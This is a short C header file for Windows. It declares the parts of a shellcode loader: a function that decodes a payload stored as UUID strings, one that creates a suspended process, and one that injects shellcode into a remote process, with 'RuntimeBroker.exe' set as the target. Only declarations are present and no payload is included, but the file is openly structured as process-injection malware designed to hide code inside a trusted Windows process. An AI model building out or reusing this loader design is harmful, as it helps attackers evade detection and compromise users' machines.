#pragma once
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#define NumberOfElements 17
#define TARGET_PROCESS "RuntimeBroker.exe"

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR StringUuid,
	UUID* Uuid
	);

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress);

BOOL UuidDeobfuscation(IN const char* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize);

BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread);